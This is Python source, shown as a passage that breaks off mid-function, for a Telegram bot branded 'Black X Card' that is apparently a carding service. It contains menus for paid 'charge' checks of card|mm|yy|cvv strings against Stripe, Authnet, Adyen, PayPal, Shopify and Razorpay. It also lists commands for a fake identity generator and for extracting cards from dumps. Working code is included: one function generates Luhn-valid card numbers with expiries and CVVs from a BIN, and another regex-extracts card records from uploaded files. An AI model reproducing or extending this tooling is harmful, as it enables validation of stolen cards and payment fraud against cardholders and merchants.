            InlineKeyboardButton("𝙉𝙤𝙧𝙢𝙖𝙡 𝙎𝙩𝙧𝙞𝙥𝙚", callback_data="stripe_charge_menu"),
            InlineKeyboardButton("𝘼𝙪𝙩𝙝 𝙉𝙚𝙩 🧠", callback_data="authnet_menu")
        ],
        # ✅ Line 3 - 2 buttons
        [
            InlineKeyboardButton("🌊 𝙊𝙘𝙚𝙖𝙣", callback_data="ocean_menu"),
            InlineKeyboardButton("𝘼𝙙𝙮𝙚𝙣 ⚡", callback_data="adyen_menu")
        ],
        # ✅ Line 4 - 2 buttons
        [
            InlineKeyboardButton("💰 𝙋𝙖𝙮𝙋𝙖𝙡 1$", callback_data="paypal1_menu"),
            InlineKeyboardButton("𝙋𝙖𝙮𝙋𝙖𝙡 9$ 💎", callback_data="paypal9_menu")
        ],
        # ✅ Line 5 - 1 button (center)
        [
            InlineKeyboardButton("𝙍𝙖𝙯𝙤𝙧 𝙋𝙖𝙮 💸", callback_data="razorpay_menu")
        ],
        # ✅ Back button
        [
            InlineKeyboardButton("◀️ Back to Gate Menu", callback_data="gates_menu")
        ]
    ])

    try:
        await q.edit_message_caption(
            caption=text,
            parse_mode=ParseMode.HTML,
            reply_markup=keyboard
        )
    except Exception as e:
        logger.warning(f"Failed to edit message, sending a new one: {e}")
        await q.message.reply_text(
            text=text,
            parse_mode=ParseMode.HTML,
            reply_markup=keyboard,
            disable_web_page_preview=True
        )



# Auto Shopify Menu
async def auto_shopify_menu_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    
    bullet = "<a href='https://t.me/BlackXCards'>「❃」</a>"
    
    text = (
        "━━━━━━ 𝘼𝙪𝙩𝙤 𝙎𝙝𝙤𝙥𝙞𝙛𝙮 ━━━━━━\n\n"
        f"{bullet} 𝘾𝙤𝙢𝙖𝙣𝙙   <code>/sh</code> [𝙎𝙞𝙣𝙜𝙡𝙚 𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜]\n"
        f"{bullet} 𝙈𝙖𝙨𝙨     <code>/msp</code> [𝙈𝙖𝙨𝙨 𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜]\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{bullet} 𝘼𝙙𝙙 𝙎𝙞𝙩𝙚   <code>/add &lt;site&gt;</code>\n"
        f"{bullet} 𝘼𝙙𝙙 𝙈𝙪𝙡𝙩𝙞𝙥𝙡𝙚 𝙎𝙞𝙩𝙚 <code>/adurls &lt;site&gt;</code>\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{bullet} 𝙐𝙨𝙚 <code>/removeall</code> 𝙏𝙤 𝙍𝙚𝙢𝙤𝙫𝙚 𝘼𝙡𝙡 𝘼𝙙𝙙𝙚𝙙 𝙎𝙝𝙤𝙥𝙞𝙛𝙮 𝙎𝙞𝙩𝙚𝙨\n"
        f"{bullet} 𝙐𝙨𝙚 <code>/rsite</code> 𝙏𝙤 𝙍𝙚𝙢𝙤𝙫𝙚 𝙎𝙞𝙣𝙜𝙡𝙚 𝙎𝙝𝙤𝙥𝙞𝙛𝙮 𝙎𝙞𝙩𝙚"
    )

    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("◀️ Back to Charge Menu", callback_data="charge_gateway_menu")]
    ])
    
    await q.edit_message_caption(caption=text, parse_mode=ParseMode.HTML, reply_markup=keyboard)

# SK Based Menu
async def sk_based_menu_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    
    bullet = "<a href='https://t.me/BlackXCards'>「❃」</a>"
    
    text = (
        "💸━━ 𝐒𝐊-𝐁𝐚𝐬𝐞𝐝 𝐋𝐨𝐨𝐤𝐔𝐏 ━━🧠\n\n"
        f"{bullet} SK-Based $1 Charge\n"
        f"⤷ 𝐂𝐌𝐃: <code>/cc card|mm|yy|cvv</code>\n"
        f"⤷ 𝐏𝐫𝐢𝐜𝐞: $1.00\n\n"
        f"{bullet} SK-Based $5 Charge\n"
        f"⤷ 𝐂𝐌𝐃: <code>/su card|mm|yy|cvv</code>\n"
        f"⤷ 𝐏𝐫𝐢𝐜𝐞: $5.00\n\n"
        f"{bullet} SK-Based Custom Amount\n"
        f"⤷ 𝐒𝐞𝐭 𝐀𝐦𝐨𝐮𝐧𝐭: <code>/ps &lt;amount&gt;</code>\n"
        f"⤷ 𝐔𝐬𝐞 𝐂𝐨𝐦𝐦𝐚𝐧𝐝: <code>/ps card|mm|yy|cvv</code>\n"
        f"⤷ 𝐑𝐞𝐬𝐞𝐭 𝐀𝐦𝐨𝐮𝐧𝐭: <code>/rps</code>\n"
        f"⤷ 𝐑𝐚𝐧𝐠𝐞: $1 - $1000\n\n"
        f"{bullet} 𝐒𝐭𝐚𝐭𝐮𝐬  : 𝑨𝒄𝒕𝒊𝒗𝒆 ✅\n"
        f"{bullet} 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 : SK-Based Stripe\n"
        "━━━━━━━━━━━━━━━━━━"
    )

    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("◀️ Back to Charge Menu", callback_data="charge_gateway_menu")]
    ])
    
    await q.edit_message_caption(caption=text, parse_mode=ParseMode.HTML, reply_markup=keyboard)

# Stripe Charge Menu
async def stripe_charge_menu_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    
    bullet = "<a href='https://t.me/BlackXCards'>「❃」</a>"
    
    text = (
        "━━━━━━━━ 𝐒𝐭𝐫𝐢𝐩𝐞 1$ ━━━━━━━━\n\n"
        f"{bullet} 𝐂𝐌𝐃   : <code>/st</code>\n"
        f"{bullet} 𝐒𝐭𝐚𝐭𝐮𝐬  : 𝑨𝒄𝒕𝒊𝒗𝒆 ✅\n"
        f"{bullet} 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 : Stripe\n"
        f"{bullet} 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 𝐂𝐡𝐚𝐫𝐠𝐞   : $1\n"
        "━━━━━━━━━━━━━━━━━━\n\n"
        "━━━━━━━━ 𝐒𝐭𝐫𝐢𝐩𝐞 3$ ━━━━━━━━\n\n"
        f"{bullet} 𝐂𝐌𝐃   : <code>/st1</code>\n"
        f"{bullet} 𝐒𝐭𝐚𝐭𝐮𝐬  : 𝑨𝒄𝒕𝒊𝒗𝒆 ✅\n"
        f"{bullet} 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 : Stripe\n"
        f"{bullet} 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 𝐂𝐡𝐚𝐫𝐠𝐞   : $3\n"
        "━━━━━━━━━━━━━━━━━━━━━"
    )

    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("◀️ Back to Charge Menu", callback_data="charge_gateway_menu")]
    ])
    
    await q.edit_message_caption(caption=text, parse_mode=ParseMode.HTML, reply_markup=keyboard)

# AuthNet Menu
async def authnet_menu_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    
    bullet = "<a href='https://t.me/BlackXCards'>「❃」</a>"
    
    text = (
        "━━━━━━ 🧠 𝘼𝙪𝙩𝙝 𝙉𝙚𝙩 💸 ━━━━━━\n\n"
        f"{bullet} 𝘾𝙤𝙢𝙢𝙖𝙣𝙙 ↭ <code>/at</code>\n"
        f"{bullet} 𝙎𝙩𝙖𝙩𝙪𝙨 ↭ 𝑨𝒄𝒕𝒊𝒗𝒆 ✅\n"
        f"{bullet} 𝙂𝙖𝙩𝙚𝙬𝙖𝙮 ↭  Authnet\n"
        f"{bullet} 𝙂𝙖𝙩𝙚𝙬𝙖𝙮 𝘾𝙝𝙖𝙧𝙜𝙚 ↭ $1.0\n"
        "━━━━━━━━━━━━━━━━━━━━"
    )

    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("◀️ Back to Charge Menu", callback_data="charge_gateway_menu")]
    ])
    
    await q.edit_message_caption(caption=text, parse_mode=ParseMode.HTML, reply_markup=keyboard)

# Ocean Charge Menu
async def ocean_menu_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    
    bullet = "<a href='https://t.me/BlackXCards'>「❃」</a>"
    
    text = (
        "━━━━ 🌊 𝙊𝙘𝙚𝙖𝙣 𝘾𝙝𝙖𝙧𝙜𝙚 💸 ━━━━\n\n"
        f"{bullet} 𝘾𝙤𝙢𝙢𝙖𝙣𝙙 ↭ <code>/oc</code>\n"
        f"{bullet} 𝙎𝙩𝙖𝙩𝙪𝙨 ↭ 𝑨𝒄𝒕𝒊𝒗𝒆 ✅\n"
        f"{bullet} 𝙂𝙖𝙩𝙚𝙬𝙖𝙮 ↭ Ocean Payments\n"
        f"{bullet} 𝙂𝙖𝙩𝙚𝙬𝙖𝙮 𝘾𝙝𝙖𝙧𝙜𝙚 ↭ $4\n"
        "━━━━━━━━━━━━━━━━━━━━"
    )

    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("◀️ Back to Charge Menu", callback_data="charge_gateway_menu")]
    ])
    
    await q.edit_message_caption(caption=text, parse_mode=ParseMode.HTML, reply_markup=keyboard)

# Adyen Charge Menu
async def adyen_menu_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    
    bullet = "<a href='https://t.me/BlackXCards'>「❃」</a>"
    
    text = (
        "━━━━━━ 𝘼𝙙𝙮𝙚𝙣 𝘾𝙝𝙖𝙧𝙜𝙚 ━━━━━━\n\n"
        f"{bullet} 𝘾𝙤𝙢𝙢𝙖𝙣𝙙 ↭ <code>/ad</code>\n"
        f"{bullet} 𝙎𝙩𝙖𝙩𝙪𝙨 ↭ 𝑨𝒄𝒕𝒊𝒗𝒆 ✅\n"
        f"{bullet} 𝙂𝙖𝙩𝙚𝙬𝙖𝙮 ↭ Adyen\n"
        f"{bullet} 𝙂𝙖𝙩𝙚𝙬𝙖𝙮 𝘾𝙝𝙖𝙧𝙜𝙚 ↭ $1\n"
        "━━━━━━━━━━━━━━━━━━━━"
    )

    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("◀️ Back to Charge Menu", callback_data="charge_gateway_menu")]
    ])
    
    await q.edit_message_caption(caption=text, parse_mode=ParseMode.HTML, reply_markup=keyboard)

# PayPal 1$ Menu
async def paypal1_menu_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    
    bullet = "<a href='https://t.me/BlackXCards'>「❃」</a>"
    
    text = (
        "━━━━━━━ 𝙋𝙖𝙮𝙋𝙖𝙡 1$ ━━━━━━━\n\n"
        f"{bullet} 𝘾𝙤𝙢𝙢𝙖𝙣𝙙 ↭ <code>/pp</code>\n"
        f"{bullet} 𝙎𝙩𝙖𝙩𝙪𝙨 ↭ 𝘼𝙘𝙩𝙞𝙫𝙚 🔥\n"
        f"{bullet} 𝙂𝙖𝙩𝙚𝙬𝙖𝙮 ↭ PayPal\n"
        f"{bullet} 𝙂𝙖𝙩𝙚𝙬𝙖𝙮 𝘾𝙝𝙖𝙧𝙜𝙚 ↭ $1\n"
        "━━━━━━━━━━━━━━━━━━━━"
    )

    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("◀️ Back to Charge Menu", callback_data="charge_gateway_menu")]
    ])
    
    await q.edit_message_caption(caption=text, parse_mode=ParseMode.HTML, reply_markup=keyboard)

# PayPal 9$ Menu
async def paypal9_menu_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    
    bullet = "<a href='https://t.me/BlackXCards'>「❃」</a>"
    
    text = (
        "━━━━━━━ 𝙋𝙖𝙮𝙋𝙖𝙡 9$ ━━━━━━━\n\n"
        f"{bullet} 𝘾𝙤𝙢𝙢𝙖𝙣𝙙 ↭ <code>/py</code>\n"
        f"{bullet} 𝙎𝙩𝙖𝙩𝙪𝙨 ↭ 𝑨𝒄𝒕𝒊𝒗𝒆 🧠💎\n"
        f"{bullet} 𝙂𝙖𝙩𝙚𝙬𝙖𝙮 ↭ PayPal\n"
        f"{bullet} 𝙂𝙖𝙩𝙚𝙬𝙖𝙮 𝘾𝙝𝙖𝙧𝙜𝙚 ↭ $9\n"
        "━━━━━━━━━━━━━━━━━━━━"
    )

    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("◀️ Back to Charge Menu", callback_data="charge_gateway_menu")]
    ])
    
    await q.edit_message_caption(caption=text, parse_mode=ParseMode.HTML, reply_markup=keyboard)

# RazorPay Menu
# RazorPay Menu
async def razorpay_menu_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    
    bullet = "<a href='https://t.me/BlackXCards'>「❃」</a>"
    
    text = (
        "━━━━━━━ 𝙍𝙖𝙯𝙤𝙧 𝙋𝙖𝙮 ━━━━━━━\n\n"
        f"{bullet} 𝘾𝙤𝙢𝙢𝙖𝙣𝙙 ↭ <code>/rz</code>\n"
        f"{bullet} 𝙎𝙩𝙖𝙩𝙪𝙨 ↭ Maintenance 😵\n"
        f"{bullet} 𝙂𝙖𝙩𝙚𝙬𝙖𝙮 ↭ 𝙍𝙖𝙯𝙤𝙧 𝙋𝙖𝙮\n"
        f"{bullet} 𝙂𝙖𝙩𝙚𝙬𝙖𝙮 𝘾𝙝𝙖𝙧𝙜𝙚 ↭ 1₹\n"
        "━━━━━━━━━━━━━━━━━━━━"
    )

    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("◀️ Back to Charge Menu", callback_data="charge_gateway_menu")]
    ])
    
    try:
        await q.edit_message_caption(caption=text, parse_mode=ParseMode.HTML, reply_markup=keyboard)
    except Exception as e:
        logger.warning(f"Failed to edit message, sending a new one: {e}")
        await q.message.reply_text(
            text=text,
            parse_mode=ParseMode.HTML,
            reply_markup=keyboard,
            disable_web_page_preview=True
        )





from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.constants import ParseMode
from telegram.ext import ApplicationBuilder, ContextTypes, CallbackQueryHandler, CommandHandler
from telegram.error import TelegramError
import logging
import html

# Logging
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Invisible padding character
PAD_CHAR = "\u200A"
LINE_WIDTH = 69  # fixed width for all lines

def escape_html(text: str) -> str:
    return html.escape(text, quote=False)

# All commands - Type is always "Free/Premium"
ALL_COMMANDS = [
    ("Stripe 1$", "/st"),
    ("Stripe 3$", "/st1"),
    ("Single Stripe Auth", "/chk"),
    ("Mass x30 Stripe Auth 2", "/mass"),
    ("Authnet 2.5$ Charge", "/at"),
    ("Adyen 1.0$ Charge", "/ad"),
    ("Paypal 1$", "/pp"),    
    ("Paypal Payments 9$", "/py"),
    ("3DS Lookup", "/vbv"),
    ("Shopify Charge $0.98", "/sh"),
    ("Shopify Charge $10", "/hc"),
    ("Razorpay charge 1₹", "/rz"),
    ("Set your Shopify site", "/add"),
    ("Auto check on your site", "/sh"),
    ("Mass Shopify Charged", "/msp"),
    ("Check if Shopify site is live", "/check"),
    ("Mass Shopify site check", "/msite"),
    ("Check your added sites", "/mysites"),
    ("Set 20 Shopify sites", "/adurls"),
    ("Remove all added sites", "/removeall"),
    ("Remove specific sites", "/rsite"),
    ("Generate cards from BIN", "/gen"),
    ("Payment Gateway Checker", "/gate"),
    ("BIN lookup", "/bin"),
    ("Fake identity generator", "/fk"),
    ("Extract CCs from dumps", "/fl"),
    ("Extract cards from file", "/open"),
    ("Redeem a bot code", "/redeem"),
    ("Welcome message", "/start"),
    ("Show all commands", "/cmds"),
    ("Bot system status", "/status"),
    ("Check your remaining credits", "/credits"),
    ("Show your user info", "/info")
]

# Split into pages (4 commands per page)
PAGE_SIZE = 4
PAGES = [ALL_COMMANDS[i:i + PAGE_SIZE] for i in range(0, len(ALL_COMMANDS), PAGE_SIZE)]

def pad_line(label: str, value: str) -> str:
    return f"<b><i>{label}:</i></b> <i>{value}</i>"

def build_page_text(page_index: int) -> str:
    try:
        page_commands = PAGES[page_index]
        text = "━━━━━━━━━━━━━━━━━━━━━━\n"
        text += f"<i>◆ 𝐂𝐌𝐃𝐒 𝐏𝐀𝐆𝐄 {page_index + 1}/{len(PAGES)}</i>\n"
        text += "━━━━━━━━━━━━━━━━━━━━━━\n"
        for name, cmd in page_commands:
            text += pad_line("Name", escape_html(name)) + "\n"
            text += pad_line("Use", escape_html(cmd)) + "\n"
            text += pad_line("Status", "Online ✅") + "\n"
            text += pad_line("Type", "Free/Premium") + "\n"
            text += "━━━━━━━━━━━━━━━━━━━━━━\n"
        return text.strip()
    except Exception as e:
        logger.error(f"Error building page text: {e}")
        return "Error: Could not build page text."

def build_cmds_buttons(page_index: int) -> InlineKeyboardMarkup:
    buttons = []
    nav_buttons = []
    if page_index > 0:
        nav_buttons.append(InlineKeyboardButton("⬅️ Back", callback_data=f"page_{page_index - 1}"))
    if page_index < len(PAGES) - 1:
        nav_buttons.append(InlineKeyboardButton("➡️ Next", callback_data=f"page_{page_index + 1}"))
    if nav_buttons:
        buttons.append(nav_buttons)
    buttons.append([InlineKeyboardButton("❌ Close", callback_data="close")])
    return InlineKeyboardMarkup(buttons)

# /cmds command handler
async def cmds_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = build_page_text(0)
    buttons = build_cmds_buttons(0)
    await update.message.reply_text(
        text,
        parse_mode=ParseMode.HTML,
        disable_web_page_preview=True,
        reply_markup=buttons
    )

# Pagination handler for /cmds buttons
async def cmds_pagination(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data

    if data.startswith("page_"):
        try:
            page_index = int(data.split("_")[1])
            text = build_page_text(page_index)
            buttons = build_cmds_buttons(page_index)
            await query.message.edit_text(
                text,
                parse_mode=ParseMode.HTML,
                disable_web_page_preview=True,
                reply_markup=buttons
            )
        except TelegramError as e:
            logger.error(f"TelegramError: {e}")
        except Exception as e:
            logger.error(f"Error in pagination: {e}")

# Close button handler
async def handle_close(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await query.message.delete()






from telegram import Update
from telegram.constants import ParseMode
from telegram.ext import ContextTypes

# Replace with your *legit* group/channel link
BULLET_GROUP_LINK = "https://t.me/+EwCcMzxhQ6Y3MTQ0"

def escape_markdown_v2(text: str) -> str:
    """Escapes special characters for Telegram MarkdownV2."""
    import re
    return re.sub(r'([_*\[\]()~`>#+\-=|{}.!\\])', r'\\\1', str(text))

async def info(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Shows the user's detailed information."""
    user = update.effective_user
    user_data = await get_user(user.id)

    # Define the bullet point with the hyperlink (full ⩙ visible & clickable)
    bullet_text = "⩙"  # Yeh change karo
    bullet_link = f"[{bullet_text}]({BULLET_GROUP_LINK})"

    # Escape all dynamic values
    first_name = escape_markdown_v2(user.first_name or 'N/A')
    user_id = escape_markdown_v2(str(user.id))
    username = escape_markdown_v2(user.username or 'N/A')
    status = escape_markdown_v2(user_data.get('status', 'N/A'))
    credits = escape_markdown_v2(str(user_data.get('credits', 0)))
    plan = escape_markdown_v2(user_data.get('plan', 'N/A'))
    plan_expiry = escape_markdown_v2(user_data.get('plan_expiry', 'N/A'))
    keys_redeemed = escape_markdown_v2(str(user_data.get('keys_redeemed', 0)))
    registered_at = escape_markdown_v2(user_data.get('registered_at', 'N/A'))

    info_message = (
        "🔍 *Your Info on 𝑩𝒍𝒂𝒄𝒌 𝑿 𝑪𝒂𝒓𝒅* ⚡\n"
        "━━━━━━━━━━━━━━\n"
        f"{bullet_link}  𝙁𝙞𝙧𝙨𝙩 𝙉𝙖𝙢𝙚: `{first_name}`\n"
        f"{bullet_link}  𝙄𝘿: `{user_id}`\n"
        f"{bullet_link}  𝙐𝙨𝙚𝙧𝙣𝙖𝙢𝙚: {username}\n\n"
        f"{bullet_link}  𝙎𝙩𝙖𝙩𝙪𝙨: `{status}`\n"
        f"{bullet_link}  𝘾𝙧𝙚𝙙𝙞𝙩: `{credits}`\n"
        f"{bullet_link}  𝙋𝙡𝙖𝙣: `{plan}`\n"
        f"{bullet_link}  𝙋𝙡𝙖𝙣 𝙀𝙭𝙥𝙞𝙧𝙮: `{plan_expiry}`\n"
        f"{bullet_link}  𝙆𝙚𝙮𝙨 𝙍𝙚𝙙𝙚𝙚𝙢𝙚𝙙: `{keys_redeemed}`\n"
        f"{bullet_link}  𝙍𝙚𝙜𝙞𝙨𝙩𝙚𝙧𝙚𝙙 𝘼𝙩: `{registered_at}`\n"
    )

    await update.message.reply_text(
        info_message,
        parse_mode=ParseMode.MARKDOWN_V2,
        disable_web_page_preview=True
    )






from telegram import Update
from telegram.constants import ParseMode
from telegram.ext import ContextTypes
from telegram.helpers import escape_markdown as escape_markdown_v2
import random, io
from datetime import datetime
from bin import get_bin_info  # Your BIN lookup function

# ===== /gen Command =====
async def gen(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Generates cards from a given BIN/sequence."""
    
    user = update.effective_user
    
    # Enforce cooldown (assuming function defined)
    if not await enforce_cooldown(user.id, update):
        return
    
    # Get user data and check credits
    user_data = await get_user(user.id)
    if user_data['credits'] <= 0:
        return await update.effective_message.reply_text(
            escape_markdown_v2("❌ You have no credits left. Please get a subscription to use this command."),
            parse_mode=ParseMode.MARKDOWN_V2
        )
    
    # Get input
    if context.args:
        raw_input = context.args[0]
    else:
        raw_input = None
    
    if not raw_input:
        return await update.effective_message.reply_text(
            escape_markdown_v2(
                "❌ Please provide BIN or sequence (at least 6 digits).\n"
                "Usage:\n`/gen 414740`\n`/gen 445769 20`\n`/gen 414740|11|2028|777`"
            ),
            parse_mode=ParseMode.MARKDOWN_V2
        )
    
    # Split input parts
    parts = raw_input.split("|")
    card_base = parts[0].strip()
    extra_mm = parts[1].zfill(2) if len(parts) > 1 and parts[1].isdigit() else None
    extra_yyyy = parts[2] if len(parts) > 2 and parts[2].isdigit() else None
    extra_cvv = parts[3] if len(parts) > 3 and parts[3].isdigit() else None
    
    if not card_base.isdigit() or len(card_base) < 6:
        return await update.effective_message.reply_text(
            escape_markdown_v2("❌ BIN/sequence must be at least 6 digits."),
            parse_mode=ParseMode.MARKDOWN_V2
        )
    
    # Determine number of cards
    num_cards = 10  # default
    send_as_file = False
    if len(context.args) > 1 and context.args[1].isdigit():
        num_cards = int(context.args[1])
        send_as_file = True
    
    # Consume 1 credit
    if not await consume_credit(user.id):
        return await update.effective_message.reply_text(
            escape_markdown_v2("❌ You have no credits left. Please get a subscription to use this command."),
            parse_mode=ParseMode.MARKDOWN_V2
        )
    
    # ==== Fetch BIN info ====
    try:
        bin_number = card_base[:6]
        bin_details = await get_bin_info(bin_number)

        brand = (bin_details.get("scheme") or "N/A").title()
        issuer = bin_details.get("bank") or "N/A"
        country_name = bin_details.get("country") or "N/A"
        country_flag = bin_details.get("country_emoji", "")
        card_type = bin_details.get("type", "N/A")
        card_level = bin_details.get("level", "N/A")
        card_length = bin_details.get("length") or (15 if "amex" in brand.lower() else 16)
        luhn_check = "✅" if bin_details.get("luhn", True) else "❌"
        bank_phone = bin_details.get("bank_phone", "N/A")
        bank_url = bin_details.get("bank_url", "N/A")
    except Exception:
        brand = issuer = country_name = country_flag = card_type = card_level = bank_phone = bank_url = "N/A"
        card_length = 16
        luhn_check = "N/A"
    
    # ==== Generate cards ====
    cards = []
    attempts = 0
    max_attempts = num_cards * 100
    while len(cards) < num_cards and attempts < max_attempts:
        attempts += 1
        suffix_len = card_length - len(card_base)
        if suffix_len < 0:
            break
        
        card_number = card_base + ''.join(str(random.randint(0, 9)) for _ in range(suffix_len))
        if not luhn_checksum(card_number):
            continue
        
        mm = extra_mm or str(random.randint(1, 12)).zfill(2)
        yyyy = extra_yyyy or str(datetime.now().year + random.randint(1, 5))
        cvv = extra_cvv or (str(random.randint(0, 9999)).zfill(4) if card_length == 15 else str(random.randint(0, 999)).zfill(3))
        
        cards.append(f"{card_number}|{mm}|{yyyy[-2:]}|{cvv}")
    
    # ==== BIN info block in grey ====
    escaped_bin_info = (
        "```\n"
        f"BIN       ➳ {escape_markdown_v2(card_base)}\n"
        f"Brand     ➳ {escape_markdown_v2(brand)}\n"
        f"Type      ➳ {escape_markdown_v2(card_type)} | {escape_markdown_v2(card_level)}\n"
        f"Bank      ➳ {escape_markdown_v2(issuer)}\n"
        f"Country   ➳ {escape_markdown_v2(country_name)}\n"
        "```"
    )
    
    # ==== Send output ====
    if send_as_file:
        file_content = "\n".join(cards)
        file = io.BytesIO(file_content.encode('utf-8'))
        file.name = f"generated_cards_{card_base}.txt"
        await update.effective_message.reply_document(
            document=file,
            caption=f"```\nGenerated {len(cards)} cards 💳\n```\n\n{escaped_bin_info}",
            parse_mode=ParseMode.MARKDOWN_V2
        )
    else:
        cards_list = "\n".join(f"`{c}`" for c in cards)
        final_message = (
            f"```\nGenerated {len(cards)} cards 💳\n```\n\n"
            f"{cards_list}\n\n"
            f"{escaped_bin_info}"
        )
        await update.effective_message.reply_text(
            final_message,
            parse_mode=ParseMode.MARKDOWN_V2
        )








import re
from telegram import Update
from telegram.ext import ContextTypes
from telegram.constants import ParseMode
import io
from telegram.helpers import escape_markdown as escape_markdown_v2

# These are placeholder functions. You will need to define the actual
# logic for them elsewhere in your codebase.
async def get_user(user_id):
    """Placeholder function to retrieve user data, e.g., from a database."""
    # Returning dummy data for the purpose of a runnable example.
    return {
        'status': 'Active',
        'credits': 100,
        'plan': 'Free Tier',
        'plan_expiry': 'N/A',
        'keys_redeemed': 2,
        'registered_at': '2025-01-01'
    }

async def update_user(user_id, **kwargs):
    """Placeholder function to update user data, e.g., deducting credits."""
    print(f"User {user_id} updated with {kwargs}")
    return True

async def enforce_cooldown(user_id, update):
    """Placeholder function to enforce command cooldowns."""
    # You can implement your cooldown logic here.
    # For now, we will return True to allow the command to proceed.
    return True

async def open_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    Extracts credit cards from an uploaded text file, or from a file
    in a replied-to message, with a maximum limit of 100 cards.
    A single credit is deducted per command use.
    """
    # The authorization check has been removed, so all users can access this command.

    user = update.effective_user
    if not await enforce_cooldown(user.id, update):
        return

    # Fetch user data to check credits
    user_data = await get_user(user.id)
    # Check for at least 1 credit to run the command
    if not user_data or user_data.get('credits', 0) <= 0:
        return await update.effective_message.reply_text(
            escape_markdown_v2("❌ You have no credits left. Please get a subscription to use this command."),
            parse_mode=ParseMode.MARKDOWN_V2
        )

    # Check for a replied-to message with a document
    if update.effective_message.reply_to_message and update.effective_message.reply_to_message.document:
        document = update.effective_message.reply_to_message.document
    # Fallback to checking the current message for a document
    elif update.effective_message.document:
        document = update.effective_message.document
    else:
        return await update.effective_message.reply_text(
            escape_markdown_v2("❌ Please reply to a txt file with the command or attach a txt file with the command."),
            parse_mode=ParseMode.MARKDOWN_V2
        )

    # Check if the file is a text file
    if document.mime_type != 'text/plain':
        return await update.effective_message.reply_text(escape_markdown_v2("❌ The file must be a text file (.txt)."), parse_mode=ParseMode.MARKDOWN_V2)

    # Deduct a single credit for the command
    await update_user(user.id, credits=user_data['credits'] - 1)

    # Get the file and download its content
    try:
        file_obj = await document.get_file()
        file_content_bytes = await file_obj.download_as_bytearray()
        file_content = file_content_bytes.decode('utf-8')
    except Exception as e:
        return await update.effective_message.reply_text(escape_markdown_v2(f"❌ An error occurred while reading the file: {e}"), parse_mode=ParseMode.MARKDOWN_V2)

    # Regex to find credit card patterns
    card_pattern = re.compile(r'(\d{13,16}\|\d{1,2}\|\d{2,4}\|\d{3,4})')
    
    # Find all matches
    found_cards = card_pattern.findall(file_content)
    
    # Check if the number of cards exceeds the 100 limit
    if len(found_cards) > 100:
        return await update.effective_message.reply_text(
            escape_markdown_v2("❌ The maximum number of cards allowed to open is 100. Please upload a smaller file."),
            parse_mode=ParseMode.MARKDOWN_V2
        )

    if not found_cards:
        return await update.effective_message.reply_text(escape_markdown_v2("❌ No valid cards were found in the file."), parse_mode=ParseMode.MARKDOWN_V2)

    # Format the output message with count and monospace
    cards_list = "\n".join([f"`{card}`" for card in found_cards])
    
    # Create the stylish box for the caption/message
    stylish_card_box = (
        f"💳 𝘽𝙡𝙖𝙘𝙠 𝙓 𝘾𝙖𝙧𝙙 💳\n\n"
        f"╭━━━━━━━━━━━━━━━━━━⬣\n"
        f"┣ ❏ 𝐅𝐨𝐮𝐧𝐝 *{len(found_cards)}* 𝐂𝐚𝐫𝐝𝐬\n"
        f"╰━━━━━━━━━━━━━━━━━━⬣\n"
    )
    
    # Combine the box and the list of cards
    final_message = f"{stylish_card_box}\n{cards_list}"
    
    # Check if the message is too long to be sent normally
    # A safe limit, as Telegram's is 4096
    if len(final_message) > 4000:
        file_content = "\n".join(found_cards)
        file = io.BytesIO(file_content.encode('utf-8'))
        file.name = f"extracted_cards.txt"
        
        await update.effective_message.reply_document(
            document=file,
            caption=f"{stylish_card_box}",
            parse_mode=ParseMode.MARKDOWN_V2
        )
    else:
        await update.effective_message.reply_text(
            final_message,
            parse_mode=ParseMode.MARKDOWN_V2
        )


import re
from telegram import Update
from telegram.ext import ContextTypes
from telegram.constants import ParseMode
import io
from telegram.helpers import escape_markdown as escape_markdown_v2

async def adcr_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Adds a specified number of credits to a user's account, restricted to a specific owner."""
    # Owner ID is hardcoded
    OWNER_ID = 7254736651

    # Check if the user is the owner
    if update.effective_user.id != OWNER_ID:
        return await update.effective_message.reply_text(
            escape_markdown_v2("❌ You are not allowed to use this command."),
            parse_mode=ParseMode.MARKDOWN_V2
        )

    # Check for correct number of arguments
    if len(context.args) != 2:
        return await update.effective_message.reply_text(
